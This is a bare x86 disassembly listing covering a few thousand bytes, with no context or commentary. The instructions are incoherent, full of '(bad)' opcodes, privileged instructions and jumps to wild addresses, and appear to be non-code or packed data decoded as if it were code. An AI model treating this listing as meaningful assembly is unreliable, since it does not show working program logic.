  428d95:	inc    ebp
  428d96:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d9d:	add    ebp,esp
  428d9f:	shufps xmm1,xmm3,0xc7
  428da3:	(bad)  
  428da4:	jmp    0x7487c8cd
  428da9:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428daf:	hlt    
  428db0:	mov    ecx,DWORD PTR [edi]
  428db2:	fadd   DWORD PTR [ebp+0x0]
  428db5:	xor    ecx,DWORD PTR [edi]
  428db7:	add    ecx,ecx
  428db9:	cmp    edi,edi
  428dbb:	pmuludq mm7,QWORD PTR [edx+0x50]
  428dbf:	(bad)  
  428dc0:	jmp    0x428d4d
  428dc2:	mov    edi,esp
  428dc4:	or     al,0xc6
  428dc6:	inc    ebp
  428dc7:	(bad)  
  428dc8:	mov    eax,DWORD PTR [ebp+0x10]
  428dcb:	jne    0x428d56
  428dcd:	mov    eax,DWORD PTR [ecx]
  428dcf:	clc    
  428dd0:	add    BYTE PTR [ebp-0x40],cl
  428dd3:	xor    edx,DWORD PTR [eax-0x73]
  428dd6:	jne    0x428dd9
  428dd8:	push   DWORD PTR [edx+0x8]
  428ddb:	add    BYTE PTR [ebp+0x45],al
  428dde:	mov    ebp,ecx
  428de0:	cld    
  428de1:	add    BYTE PTR [ebp+0x0],cl
  428de4:	xor    eax,DWORD PTR [ebp+0x3]
  428de7:	mov    al,0x3b
  428de9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428def:	sub    eax,0x5d330e4d
  428df4:	lea    esi,[ebx]
  428df6:	add    DWORD PTR [ebx],eax
  428df8:	jb     0x428de3
  428dfa:	add    BYTE PTR [eax],al
  428dfc:	inc    ebp
  428dfd:	add    bl,ch
  428dff:	inc    ebp
  428e00:	mov    esi,DWORD PTR [ebx]
  428e02:	or     al,0x3
  428e04:	(bad)  
  428e05:	mov    edi,eax
  428e07:	in     al,dx
  428e08:	scas   eax,DWORD PTR es:[edi]
  428e09:	inc    ebp
  428e0a:	mov    esi,DWORD PTR [ebx]
  428e0c:	in     al,0x3
  428e0e:	add    al,0x89
  428e10:	mov    ecx,DWORD PTR [eax+edi*8]
  428e13:	dec    ebp
  428e14:	(bad)  
  428e15:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428e1c:	mov    ecx,eax
  428e1e:	cld    
  428e1f:	push   es
  428e20:	dec    ebp
  428e21:	add    al,0x33
  428e23:	mov    DWORD PTR [ebx],eax
  428e25:	in     al,dx
  428e26:	cmp    DWORD PTR [ebp-0x67],eax
  428e29:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e2f:	mov    edx,DWORD PTR [ebp-0x4]
  428e32:	mov    ecx,DWORD PTR [ebp-0x18]
  428e35:	xor    ecx,DWORD PTR [ebp+0x3]
  428e38:	cmp    DWORD PTR [ebx],0x8b327497
  428e3e:	xor    edi,esp
  428e40:	jmp    0xff768b92
  428e45:	add    ecx,DWORD PTR [ebp-0x3f]
  428e48:	xor    ebx,DWORD PTR [edi]
  428e4a:	add    eax,ecx
  428e4c:	cmp    ebx,DWORD PTR [eax]
  428e4e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e51:	mov    ecx,DWORD PTR [eax]
  428e53:	adc    BYTE PTR [ebp-0x80],al
  428e56:	jmp    0x428e59
  428e58:	mov    eax,DWORD PTR [eax]
  428e5a:	cld    
  428e5b:	mov    bh,0xc6
  428e5d:	push   ecx
  428e5e:	(bad)  
  428e5f:	jne    0x428ebf
  428e61:	dec    ecx
  428e63:	or     BYTE PTR [ecx+ebx*1],cl
  428e66:	push   ebp
  428e67:	inc    ebp
  428e68:	in     al,dx
  428e69:	add    ebp,esp
  428e6b:	or     bh,al
  428e6d:	dec    ebp
  428e6e:	cld    
  428e6f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e75:	cmp    DWORD PTR [ecx],0x2
  428e78:	pushf  
  428e79:	dec    DWORD PTR [ebx+0x45510cf4]
  428e7f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e85:	mov    edx,DWORD PTR [ecx+0xc]
  428e88:	xor    eax,esi
  428e8a:	mov    edx,0xc172c7
  428e8f:	inc    ebp
  428e90:	mov    esi,DWORD PTR [ebp+0x8]
  428e93:	mov    eax,edx
  428e95:	call   0x84c7558a
  428e9a:	add    DWORD PTR [eax-0x76bace00],ebx
  428ea0:	mov    ebp,eax
  428ea2:	or     BYTE PTR [eax],dl
  428ea4:	jo     0x428ef3
  428ea6:	push   edi
  428ea7:	xor    esi,DWORD PTR [ebp+0x3]
  428eaa:	(bad)  
  428eab:	pmulhuw mm0,mm1
  428eae:	test   DWORD PTR [ebp-0x8],ecx
  428eb1:	mov    DWORD PTR [ebp-0x67],eax
  428eb4:	mov    eax,DWORD PTR [ebp-0x4]
  428eb7:	xor    edi,DWORD PTR [ebp-0x73]
  428eba:	xor    eax,DWORD PTR [ebx]
  428ebc:	xor    esi,DWORD PTR [edx+0x3]
  428ebf:	add    BYTE PTR [ecx],bh
  428ec1:	inc    ebp
  428ec2:	(bad)  
  428ec3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ec9:	mov    DWORD PTR [eax],0x750f0004
  428ecf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428ed5:	lock add BYTE PTR [ebp+0x0],al
  428ed9:	mov    esi,DWORD PTR [ebp-0x2c]
  428edc:	mov    ebp,edx
  428ede:	or     al,0x72
  428ee0:	ja     0x428ee2
  428ee2:	mov    edx,esi
  428ee4:	cld    
  428ee5:	(bad)  
  428ee8:	cli    
  428ee9:	mov    esi,DWORD PTR [ebp-0x4]
  428eec:	cmp    ecx,esi
  428eee:	bswap  edi
  428ef0:	(bad)
  428ef4:	mov    esi,DWORD PTR [ebp-0x4]
  428ef7:	mov    esi,ecx
  428ef9:	clc    
  428efa:	repnz add esi,DWORD PTR [ebp+0x45]
  428efe:	push   ebx
  428eff:	xor    eax,DWORD PTR [ebp+0x3]
  428f02:	cmp    ebx,DWORD PTR [edi-0x64]
  428f05:	pop    ebx
  428f06:	jmp    0x428fcd
  428f0b:	mov    esi,DWORD PTR [ebp-0x7d]
  428f0e:	xor    ebp,DWORD PTR [eax]
  428f10:	lea    eax,[ebp-0x8]
  428f13:	cmp    dl,dh
  428f15:	pushf  
  428f16:	out    dx,eax
  428f17:	(bad)  
  428f18:	neg    eax
  428f1a:	ins    DWORD PTR es:[edi],dx
  428f1b:	test   esi,edi
  428f1d:	clc    
  428f1e:	pop    esp
  428f1f:	inc    ebp
  428f20:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f26:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f2c:	add    cl,al
  428f2e:	jne    0x428ec8
  428f30:	mov    esi,DWORD PTR [edx]
  428f32:	in     al,dx
  428f33:	push   esi
  428f34:	xor    BYTE PTR [ebp-0xe],dh
  428f37:	add    edi,esi
  428f39:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f3f:	add    cl,bh
  428f41:	mov    edi,DWORD PTR [ebp+0x8]
  428f44:	mov    DWORD PTR [ebp-0x14],esi
  428f47:	add    esi,DWORD PTR [ebp+0x3c]
  428f4a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f50:	mov    ah,0x3d
  428f52:	cwde   
  428f53:	pushf  
  428f54:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f5a:	jne    0x428ee7
  428f5c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f5f:	icebp  
  428f60:	icebp  
  428f61:	shl    edx,0xf2
  428f64:	(bad)  
  428f65:	mov    ah,0x16
  428f67:	cmp    BYTE PTR [ebp-0x6d],dh
  428f6a:	mov    ecx,DWORD PTR [edi]
  428f6c:	in     al,dx
  428f6d:	jmp    0x428f60
  428f6f:	add    dl,dh
  428f71:	mov    edi,esi
  428f73:	or     al,0x8
  428f75:	inc    ebp
  428f76:	jne    0x428f7b
  428f78:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f7e:	ret    
  428f7f:	or     bh,bh
  428f81:	jge    0x428f6b
  428f83:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f89:	xor    edi,eax
  428f8b:	add    esi,DWORD PTR [ebp-0x77]
  428f8e:	mov    ebx,esp
  428f90:	clc    
  428f91:	neg    DWORD PTR [ebp-0x7c]
  428f94:	xor    eax,DWORD PTR [eax]
  428f96:	cmp    eax,DWORD PTR [eax]
  428f98:	repz jne 0x428f30
  428f9b:	xor    eax,DWORD PTR [ecx]
  428f9d:	add    ebx,DWORD PTR [eax]
  428f9f:	mov    DWORD PTR [ebp-0x8],eax
  428fa2:	mov    eax,edi
  428fa4:	cld    
  428fa5:	lock pop eax
  428fa7:	test   DWORD PTR [ebx],esi
  428fa9:	clc    
  428faa:	add    edx,DWORD PTR [edi-0x740bff77]
  428fb0:	fdivp  st(4),st
  428fb2:	test   ecx,esi
  428fb4:	(bad)  
  428fb5:	jnp    0x428fb6
  428fb7:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428fbd:	jae    0x428f4a
  428fbf:	sub    edi,esp
  428fc1:	(bad)  
  428fc2:	shl    DWORD PTR [eax-0x3e],0x89
  428fc6:	leave  
  428fc7:	call   0x819846d4
  428fcc:	in     al,dx
  428fcd:	(bad)  
  428fce:	in     al,dx
  428fcf:	add    bh,al
  428fd1:	mov    esp,edi
  428fd3:	in     al,dx
  428fd4:	test   DWORD PTR [ebp-0x8],edi
  428fd7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fda:	cmp    DWORD PTR [ebx],eax
  428fdc:	pushf  
  428fdd:	jnp    0x57318c16
  428fe3:	xor    edx,DWORD PTR [eax-0x77]
  428fe6:	push   ecx
  428fe7:	loopne 0x42901c
  428fe9:	jne    0x428fa6
  428feb:	mov    esi,DWORD PTR [edx-0x20]
  428fee:	add    BYTE PTR [ebp-0x3d],bh
  428ff1:	xor    eax,DWORD PTR [ebp-0x73]
  428ff4:	mov    edi,DWORD PTR [esi]
  428ff6:	cld    
  428ff7:	jb     0x428fbf
  428ff9:	add    bl,al
  428ffb:	jne    0x429042
  428ffd:	mov    edx,DWORD PTR [edi-0x10]
  429000:	jge    0x42907f
  429002:	mov    esi,DWORD PTR [ebx]
  429004:	lock add ecx,DWORD PTR [ebp+0x3b]
  429008:	xor    esi,DWORD PTR [ebp-0x77]
  42900b:	mov    esi,eax
  42900d:	lock inc ebp
  42900f:	jge    0x429049
  429011:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  429018:	dec    ebp
  429019:	mov    esi,DWORD PTR [ebx]
  42901b:	loopne 0x428fa6
  42901d:	jge    0x429017
  42901f:	add    DWORD PTR [ebp-0x7d],eax
  429022:	clc    
  429023:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42902a:	dec    ebp
  42902b:	hlt    
  42902c:	xor    ebx,DWORD PTR [ebp-0x77]
  42902f:	mov    esi,esp
  429031:	in     al,0x45
  429033:	jge    0x429071
  429035:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42903c:	dec    ebp
  42903d:	cmp    al,0x33
  42903f:	xchg   ebx,eax
  429040:	mov    DWORD PTR [ebx-0x14],esi
  429043:	add    eax,DWORD PTR [ebp-0xc]
  429046:	cmp    BYTE PTR [ebp-0x61],dh
  429049:	mov    edi,DWORD PTR [eax+0xf19504]
  42904f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429053:	cmp    eax,DWORD PTR [ebp+0xf]
  429056:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42905a:	fistp  WORD PTR [ebx+0x0]
  42905d:	inc    ebp
  42905e:	mov    ebx,DWORD PTR [edi+0xc]
  429061:	add    eax,eax
  429063:	inc    ebp
  429064:	test   BYTE PTR [ebx],dh
  429066:	add    eax,DWORD PTR [ebx]
  429068:	add    BYTE PTR [esi+0x45],bl
  42906b:	ret    0x85
  42906e:	jnp    0x5443143d
  429074:	inc    bp
  429076:	inc    ebp
  429077:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42907d:	fdiv   QWORD PTR [ebx]
  42907f:	test   DWORD PTR [ecx+0x453af8],edi
  429085:	push   ebx
  429086:	add    edi,DWORD PTR [esi+0x708088b]
  42908c:	cmp    esi,eax
  42908e:	sets   BYTE PTR [ecx-0x74fcffce]
  429095:	mov    esp,edi
  429097:	call   0x33cdd5e9
  42909c:	or     BYTE PTR [ebx],al
  42909e:	inc    ecx
  42909f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4290a5:	and    BYTE PTR [ebp-0x7074f0bb],al
  4290ab:	lock add cl,al
  4290ae:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4290b5:	mov    ch,0x45
  4290b7:	clc    
  4290b8:	xor    eax,DWORD PTR [ebp+0x3]
  4290bb:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290c1:	inc    ebp
  4290c2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290c8:	mov    edi,eax
  4290ca:	mov    eax,DWORD PTR [ebp+0x3c]
  4290cd:	mov    ecx,DWORD PTR [eax]
  4290cf:	hlt    
  4290d0:	inc    ebp
  4290d1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290d8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290de:	push   ebp
  4290df:	mov    edi,DWORD PTR [ebx]
  4290e1:	in     al,dx
  4290e2:	jne    0x4290a5
  4290e4:	mov    eax,DWORD PTR [ebp-0x28]
  4290e7:	add    DWORD PTR [eax],0xe8058dec
  4290ed:	clc    
  4290ee:	mov    esp,DWORD PTR [edi-0x8]
  4290f1:	add    dh,dl
  4290f3:	rol    WORD PTR [ebp-0x1],cl
  4290f7:	mov    edx,DWORD PTR [eax+0x8]
  4290fa:	jne    0x4290bc
  4290fc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  429103:	inc    ebp
  429104:	push   esp
  429105:	test   DWORD PTR [ecx+0xf],ecx
  429108:	sub    edx,esp
  42910a:	add    eax,DWORD PTR [eax]
  42910c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  429112:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  429119:	mov    eax,DWORD PTR [ecx]
  42911b:	and    BYTE PTR [eax],al
  42911d:	adc    BYTE PTR ss:[eax],al
  429120:	inc    ebp
  429121:	inc    cx
  429124:	push   esp
  429125:	cld    
  429126:	jne    0x429128
  429128:	push   edx
  429129:	enterw 0xc1,0x4d
  42912e:	mov    esp,DWORD PTR [esi+0x20]
  429131:	add    DWORD PTR [ecx-0x7b],eax
  429134:	add    eax,DWORD PTR [ebx]
  429136:	str    WORD PTR [eax+0x45]
  42913a:	lea    ecx,[ebx+0x45890801]
  429140:	sbb    BYTE PTR [ebx],al
  429142:	dec    ebp
  429143:	cmp    al,0xf
  429145:	inc    ebp
  429146:	push   eax
  429147:	mov    esi,DWORD PTR [ebx]
  429149:	push   eax
  42914a:	add    eax,eax
  42914c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429153:	inc    ebp
  429154:	add    BYTE PTR [eax],bh
  429156:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42915d:	(bad)  
  42915e:	mov    ebx,eax
  429160:	loopne 0x4291a7
  429162:	dec    ebp
  429163:	mov    ecx,DWORD PTR [edi]
  429165:	cld    
  429166:	push   eax
  429167:	xchg   DWORD PTR [ebx],esi
  429169:	add    DWORD PTR [ebx],ebp
  42916b:	add    BYTE PTR [ebx],ch
  42916d:	or     BYTE PTR [ecx],bh
  42916f:	dec    ecx
  429170:	loopne 0x429175
  429172:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429178:	push   ebp
  429179:	add    DWORD PTR [ebx+0x55100800],eax
  42917f:	dec    ebp
  429180:	jmp    0x42910b
  429182:	mov    esp,DWORD PTR [eax]
  429184:	sbb    dl,dl
  429186:	inc    eax
  429187:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42918d:	add    BYTE PTR [ebx+0x74528555],cl
  429193:	push   ebp
  429194:	div    DWORD PTR [ebx]
  429196:	and    eax,DWORD PTR [ebx]
  429198:	add    edx,DWORD PTR [edx-0x30]
  42919b:	jno    0x429128
  42919d:	inc    DWORD PTR [eax+eiz*1]
  4291a0:	inc    ebp
  4291a1:	push   eax
  4291a2:	push   eax
  4291a3:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4291a9:	mov    edi,esp
  4291ab:	push   eax
  4291ac:	inc    ebp
  4291ad:	enter  0x458b,0x8
  4291b1:	push   ecx
  4291b2:	(bad)  
  4291b3:	call   0x10c9b8b
  4291b8:	pop    ss
  4291b9:	push   ebp
  4291ba:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291c0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291c6:	push   ecx
  4291c7:	jo     0x4291b1
  4291c9:	inc    DWORD PTR [edi]
  4291cb:	or     BYTE PTR [eax],al
  4291cd:	call   0xcd9917
  4291d2:	fmul   QWORD PTR [ebp+0x55]
  4291d5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291db:	mov    bh,0x8c
  4291dd:	adc    al,0x98
  4291df:	dec    esp
  4291e0:	xor    bl,BYTE PTR [eax]
  4291e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291e5:	mov    eax,DWORD PTR [ebp-0x4]
  4291e8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ee:	push   es
  4291ef:	retf   
  4291f0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291f4:	inc    ebp
  4291f5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291fc:	retf   0x83fc
  4291ff:	into   
  429200:	dec    ebp
  429201:	retf   
  429202:	mov    ecx,DWORD PTR [ebp-0x74]
  429205:	mov    eax,DWORD PTR [eax]
  429207:	fdiv   QWORD PTR [ebx]
  429209:	mov    bh,0x3
  42920b:	push   es
  42920c:	mov    esi,ecx
  42920e:	sbb    cl,dl
  429210:	dec    ebp
  429211:	sar    DWORD PTR [ebx],cl
  429213:	push   ebp
  429214:	jne    0x429225
  429216:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42921c:	lea    ebx,[eax]
  42921e:	call   0xf4cc1de5
  429223:	sbb    dh,dl
  429225:	add    edx,ebx
  429227:	push   ebp
  429228:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42922e:	push   ecx
  42922f:	mov    DWORD PTR [eax-0x30],edx
  429232:	test   DWORD PTR [edx],eax
  429234:	xadd   esp,esi
  429237:	pop    es
  429238:	add    cl,dl
  42923a:	mov    eax,ecx
  42923c:	or     al,0x45
  42923e:	(bad)  
  42923f:	push   eax
  429240:	add    DWORD PTR [edx+0x0],eax
  429243:	add    ecx,DWORD PTR [ecx]
  429245:	and    dh,cl
  429247:	call   0xc69b17
  42924c:	add    DWORD PTR [ebp+0x0],edx
  42924f:	mov    esp,DWORD PTR [ebp+0x18]
  429252:	add    BYTE PTR [eax+0x44],cl
  429255:	xor    eax,DWORD PTR [eax]
  429257:	add    esp,DWORD PTR [esi+0x3b]
  42925a:	inc    ebp
  42925b:	je     0x4291e0
  42925d:	push   ecx
  42925e:	or     cl,BYTE PTR [ebp-0x77]
  429261:	add    eax,esi
  429263:	or     al,0x5e
  429265:	inc    eax
  429266:	add    BYTE PTR [ebx],al
  429268:	data16 and BYTE PTR [ebp+0x50],al
  42926c:	sub    DWORD PTR [ecx],0xffffffe8
  42926f:	add    BYTE PTR [ebp-0x75],ah
  429272:	add    BYTE PTR [eax],bl
  429274:	enter  0x894d,0x8b
  429278:	int3   
  429279:	loopne 0x4292ad
  42927b:	rol    BYTE PTR [eax],0x33
  42927e:	lea    cx,[ebp+0xa]
  429282:	data16 jb 0x4292ca
  429285:	add    BYTE PTR [ebx+0x44890855],cl
  42928b:	sbb    ah,al
  42928d:	inc    ebp
  42928e:	lldt   WORD PTR ss:[edx+0x66]
  429293:	xor    ecx,DWORD PTR [eax]
  429295:	sub    edi,esp
  429297:	mov    eax,DWORD PTR [eax]
  429299:	or     al,0x66
  42929b:	ror    edx,cl
  42929d:	dec    ebp
  42929e:	inc    ebp
  42929f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4292a5:	cld    
  4292a6:	or     BYTE PTR [edi+0x4501dd],dl
  4292ac:	(bad)  
  4292ad:	into   
  4292ae:	out    dx,al
  4292af:	retf   
  4292b0:	(bad)  
  4292b1:	dec    ebp
  4292b2:	mov    al,0x8b
  4292b4:	jmp    0xea27:0x450ac320
  4292bb:	xchg   esi,ebp
  4292bd:	add    edi,eax
  4292bf:	add    BYTE PTR [eax+0x3f52e955],bh
  4292c5:	push   ebp
  4292c6:	inc    ebp
  4292c7:	xor    ebx,esp
  4292c9:	add    ebp,esi
  4292cb:	push   edx
  4292cc:	push   bp
  4292ce:	inc    ebp
  4292cf:	(bad)  
  4292d0:	in     eax,dx
  4292d1:	push   esp
  4292d2:	(bad)  
  4292d3:	inc    edx
  4292d5:	sbb    al,0x33
  4292d7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292de:	add    BYTE PTR [ebp+0x43],0x8b
  4292e2:	jmp    0xf98b:0x100041c8
  4292e9:	xor    esi,DWORD PTR [edx+0x3]
  4292ec:	mov    ecx,DWORD PTR [edi]
  4292ee:	fmul   DWORD PTR [edx]
  4292f0:	add    BYTE PTR [eax],al
  4292f2:	lea    eax,[ebx-0x4700273c]
  4292f8:	add    al,0x4f
  4292fa:	pop    DWORD PTR [eax]
  4292fc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  429302:	push   edx
  429303:	inc    WORD PTR [ebp+0x8]
  429307:	mov    eax,0x514f4d
  42930c:	(bad)
  429310:	add    al,al
  429312:	xor    DWORD PTR [ebx-0x74baf730],eax
  429318:	test   DWORD PTR [esi+0x74],esp
  42931b:	inc    ebp
  42931c:	mov    DWORD PTR [eax+0xa4f08],edi
  429322:	add    BYTE PTR [ecx-0x76c435bb],cl
  429328:	or     dh,cl
  42932a:	or     eax,0x8b8d5045
  42932f:	inc    ebp
  429330:	mov    WORD PTR [ecx+0x3b8a00],?
  429336:	jne    0x42936b
  429338:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42933e:	add    DWORD PTR [ebx],eax
  429340:	add    bh,bh
  429342:	adc    DWORD PTR [eax],ecx
  429344:	adc    DWORD PTR [ebp+0x55],edi
  429347:	push   es
  429348:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42934e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429355:	inc    ebp
  429356:	mov    esp,edi
  429358:	or     al,0xdc
  42935a:	push   eax
  42935b:	(bad)  
  42935c:	jne    0x429312
  42935e:	call   0x3a8c4f
  429363:	inc    ebp
  429364:	rol    dl,0x84
  429367:	out    dx,al
  429368:	add    bh,al
  42936a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429371:	(bad)  
  429372:	and    al,al
  429374:	fs in  eax,dx
  429376:	inc    DWORD PTR [ebp-0x7b]
  429379:	js     0x42938a
  42937b:	leave  
  42937c:	scas   al,BYTE PTR es:[edi]
  42937d:	inc    esp
  42937e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429385:	or     BYTE PTR [ebx-0x97717c5],0x83
  42938c:	call   DWORD PTR [edi]
  42938e:	shr    ah,0x84
  429391:	xchg   DWORD PTR [eax],eax
  429393:	add    DWORD PTR [eax],eax
  429395:	add    bh,bh
  429397:	dec    ebp
  429398:	and    BYTE PTR [ecx-0x38],dl
  42939b:	push   eax
  42939c:	dec    DWORD PTR [ebx+0xfd885]
  4293a2:	mov    BYTE PTR [ebp+0x508bac00],cl
  4293a8:	mov    WORD PTR [ecx+0x0],ss
  4293ab:	lea    ecx,[ebx+0x108b20d8]
  4293b1:	mov    WORD PTR [edx],ds
  4293b3:	add    BYTE PTR [edi+0xff01ff],al
  4293b9:	mov    ecx,DWORD PTR [ebp-0x28]
  4293bc:	push   ecx
  4293bd:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293c1:	inc    ebp
  4293c2:	in     al,0xeb
  4293c4:	jno    0x429351
  4293c6:	push   edx
  4293c7:	mov    DWORD PTR [eax-0x28],edx
  4293ca:	mov    eax,DWORD PTR [ebp+0x20]
  4293cd:	je     0x429356
  4293cf:	mov    eax,DWORD PTR [ecx]
  4293d1:	sbb    BYTE PTR [eax],al
  4293d3:	pop    DWORD PTR [eax]
  4293d5:	add    esi,eax
  4293d7:	add    bl,al
  4293d9:	adc    DWORD PTR [edi],esi
  4293db:	jmp    0x8bcde42d
  4293e0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293e7:	jne    0x429374
  4293e9:	mov    ecx,DWORD PTR [eax]
  4293eb:	in     al,0x75
  4293ed:	pop    DWORD PTR [ecx+0x5001]
  4293f3:	push   edx
  4293f4:	inc    DWORD PTR [ebx]
  4293f6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293fc:	add    BYTE PTR [edi+0x9],dl
  4293ff:	call   DWORD PTR [esi]
  429401:	and    dl,al
  429403:	and    bh,bh
  429405:	inc    edi
  429407:	test   eax,edx
  429409:	sldt   ebx
  42940c:	cmp    DWORD PTR [eax],eax
  42940e:	pushf  
  42940f:	(bad)  
  429410:	jmp    0x42941e
  429412:	mov    eax,edi
  429414:	or     al,0x75
  429416:	inc    eax
  429417:	call   0x428b1f
  42941c:	mov    eax,eax
  42941e:	loopne 0x4293a4
  429420:	inc    ebp
  429421:	add    BYTE PTR [ebx+0x1451c00],cl
  429427:	mov    eax,DWORD PTR [ebp+0x20]
  42942a:	add    edi,ecx
  42942c:	add    BYTE PTR [eax],ch
  42942e:	cmp    edi,0x18
  429431:	test   DWORD PTR [ebp+0xf],esi
  429434:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42943b:	jne    0x42943f
  42943d:	call   0xffa18f02
  429442:	leave  
  429443:	rcr    BYTE PTR [esp+eax*4],0x55
  429447:	add    ah,ch
  429449:	add    BYTE PTR [edi-0x48fef979],dh
  42944f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429456:	inc    esp
  429457:	mov    ebx,DWORD PTR [eax]
  429459:	fcom   st(2)
  42945b:	add    BYTE PTR [edi],bl
  42945d:	lea    ecx,[eax-0x18]
  429460:	(bad)  
  429461:	push   DWORD PTR [ecx]
  429463:	call   0xffb4e1c5
  429468:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42946c:	fstp   DWORD PTR [esi+ebx*8]
  42946f:	push   ebp
  429470:	pop    ebp
  429471:	mov    esi,DWORD PTR [edx-0x38]
  429474:	add    DWORD PTR [eax],0x28
  429477:	mov    edi,DWORD PTR [ebx]
  429479:	xor    esi,DWORD PTR [edx+0x3]
  42947c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429480:	pop    ebp
  429481:	or     al,0x4
  429483:	inc    ecx
  429484:	push   ebp
  429485:	(bad)  
  429486:	in     al,dx
  429487:	or     ah,ch
  429489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42948a:	xbegin 0xffc80a80
  429490:	clc    
  429491:	adc    al,0x45
  429493:	idiv   BYTE PTR [ecx]
  429495:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42949c:	test   DWORD PTR [eax+0x665300f8],ebx
  4294a2:	add    BYTE PTR [ecx+0x66],dh
  4294a5:	add    eax,DWORD PTR [ebp+0x52]
  4294a8:	adc    eax,0x20
  4294ab:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4294b1:	test   DWORD PTR [eax],eax
  4294b3:	clc    
  4294b4:	data16 or al,BYTE PTR [ebp+0x45]
  4294b8:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4294bf:	rol    BYTE PTR [ebp+0x45],1
  4294c2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294c8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ce:	push   ebx
  4294cf:	add    BYTE PTR [eax+0x0],dl
  4294d2:	push   ecx
  4294d3:	jge    0x429508
  4294d5:	add    BYTE PTR [esi+0x4],dl
  4294d8:	jne    0x42953f
  4294da:	mov    edx,0x457200
  4294df:	jmp    0x4294a3
  4294e1:	xor    edi,DWORD PTR [ebx]
  4294e3:	pop    edi
  4294e4:	cvtdq2ps xmm7,xmm0
  4294e7:	ret    0x0
  4294ea:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294f0:	xor    ecx,DWORD PTR [edi]
  4294f2:	add    eax,DWORD PTR [ecx+0x3b]
  4294f5:	push   ebx
  4294f6:	rdpmc  
  4294f8:	out    0x8d,al
  4294fa:	add    BYTE PTR [eax],cl
  4294fc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429502:	ret    0x450c
  429505:	sbb    al,0x8b
  429507:	cmp    eax,esi
  429509:	or     cl,al
  42950b:	or     al,0xc2
  42950d:	pop    eax
  42950e:	inc    ebp
  42950f:	add    ecx,DWORD PTR [edi]
  429511:	add    esi,DWORD PTR [ebp+0x39]
  429514:	invd   
  429516:	jge    0x429522
  429518:	mov    eax,0x478ac0
  42951d:	cli    
  42951e:	xor    esp,ecx
  429520:	mov    ebx,0x5b8ac0
  429525:	ret    0x33
  429528:	mov    eax,0x833a8b
  42952d:	sub    BYTE PTR [ebx],al
  42952f:	inc    ebp
  429530:	data16 cmp al,bh
  429533:	pushf  
  429534:	inc    bh
  429536:	mov    esp,esp
  429538:	hlt    
  429539:	test   DWORD PTR [ebp-0x8],esi
  42953c:	mov    eax,DWORD PTR [ebp-0x14]
  42953f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429545:	dec    edi
  429546:	or     BYTE PTR [eax],al
  429548:	jne    0x4294d3
